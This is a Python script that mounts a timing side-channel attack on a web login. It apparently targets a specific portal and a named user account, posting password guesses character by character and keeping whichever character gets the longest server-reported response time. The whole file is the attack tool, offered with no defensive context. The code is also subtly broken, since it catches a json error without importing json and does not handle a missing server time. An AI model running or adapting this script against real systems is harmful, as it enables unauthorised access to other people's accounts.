import requests
import time

# URL of the target system's login page
url = 'https://portal.regjeringen.uiaikt.no/login'

# Username for which to guess the password
username = 'jonas.dahl'

# Function to measure the response time for a password guess
def measure_response_time(guess):
    data = {
        "username": username,
        "password": guess
    }
    try:
        start_time = time.time()
        response = requests.post(url, json=data, timeout=10)  # 10 seconds timeout
        end_time = time.time()
        response_data = response.json()
        return end_time - start_time, response_data.get("total_time")
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
        return None, None
    except json.JSONDecodeError:
        print("Failed to decode JSON from response")
        return None, None

# Print to confirm the script has started
print("Script started, beginning password guess...")

# The initial part of the password (start with an empty string)
password_guess = ''

# Assuming the maximum length of the password
for _ in range(20):  # Adjust this range based on the expected password length
    longest_time = 0
    next_char = ''
    print(f"Testing password length: {_ + 1}")

    for char in range(32, 127):  # ASCII printable characters
        current_guess = password_guess + chr(char)
        print(f"Trying password: {current_guess}")
        response_time, server_time = measure_response_time(current_guess)

        if response_time is None:  # Handle the case where the request failed
            continue

        if server_time > longest_time:
            longest_time = server_time
            next_char = chr(char)

    password_guess += next_char
    print(f"Current guess: {password_guess}")

# Final password found
print(f"Password found: {password_guess}")
